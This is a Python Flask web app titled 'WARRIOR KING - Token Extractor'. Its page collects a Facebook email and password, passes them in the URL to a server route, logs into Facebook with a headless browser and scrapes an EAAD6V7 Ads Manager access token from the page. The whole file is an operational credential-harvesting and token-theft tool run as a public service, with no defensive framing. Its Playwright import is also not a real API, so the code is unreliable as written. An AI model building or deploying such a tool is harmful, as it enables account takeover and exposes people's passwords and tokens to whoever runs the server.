import os
import asyncio
from flask import Flask, render_template_string, request, jsonify
from playwright.asyncio import api_start

app = Flask(__name__)

# HTML Dashboard Template
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WARRIOR KING - Token Extractor</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #1e1e1e; padding: 30px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.5); width: 100%; max-width: 400px; text-align: center; }
        h2 { color: #00d2ff; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; background: #333; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 12px; border-radius: 8px; border: none; background: #00d2ff; color: #121212; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        button:hover { background: #0099cc; }
        #result { margin-top: 20px; word-break: break-all; padding: 15px; border-radius: 8px; background: #252525; display: none; border: 1px solid #444; }
        .loader { display: none; margin: 10px auto; border: 4px solid #333; border-top: 4px solid #00d2ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h2>WARRIOR KING</h2>
        <p style="color: #888;">EAAD6V7 Token Extractor</p>
        <input type="text" id="email" placeholder="Facebook Email / Number">
        <input type="password" id="pass" placeholder="Password">
        <button onclick="extractToken()">Extract Token</button>
        <div class="loader" id="loader"></div>
        <div id="result"></div>
    </div>

    <script>
        async function extractToken() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            const resDiv = document.getElementById('result');
            const loader = document.getElementById('loader');

            if(!email || !pass) { alert("Please fill all fields"); return; }

            resDiv.style.display = 'none';
            loader.style.display = 'block';

            try {
                const response = await fetch(`/api/extract?email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}`);
                const data = await response.json();
                loader.style.display = 'none';
                resDiv.style.display = 'block';
                
                if(data.token.includes("EAAD6V7")) {
                    resDiv.innerHTML = `<span style="color: #00ff00;">Success!</span><br><br><b>Token:</b><br>${data.token}`;
                } else {
                    resDiv.innerHTML = `<span style="color: #ff4444;">Failed:</span><br>${data.token}`;
                }
            } catch (err) {
                loader.style.display = 'none';
                alert("Server Error. Check Render Logs.");
            }
        }
    </script>
</body>
</html>
"""

async def get_fb_token(email, password):
    async with api_start.playwright() as p:
        browser = await p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-setuid-sandbox'])
        context = await browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        page = await context.new_page()
        try:
            await page.goto("https://m.facebook.com/login", wait_until="networkidle")
            await page.fill('input[name="email"]', email)
            await page.fill('input[name="pass"]', password)
            await page.click('button[name="login"]')
            await page.wait_for_timeout(8000)

            # Redirect to Ads Manager for EAAD6V7 token
            await page.goto("https://adsmanager.facebook.com/adsmanager/manage/campaigns", wait_until="networkidle")
            await page.wait_for_timeout(5000)
            
            content = await page.content()
            import re
            token_match = re.search(r'(EAAD6V7\w+)', content)
            
            return token_match.group(1) if token_match else "Token not found. Check login or 2FA."
        except Exception as e:
            return str(e)
        finally:
            await browser.close()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/extract')
def api_extract():
    email = request.args.get('email')
    password = request.args.get('pass')
    token = asyncio.run(get_fb_token(email, password))
    return jsonify({"token": token})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
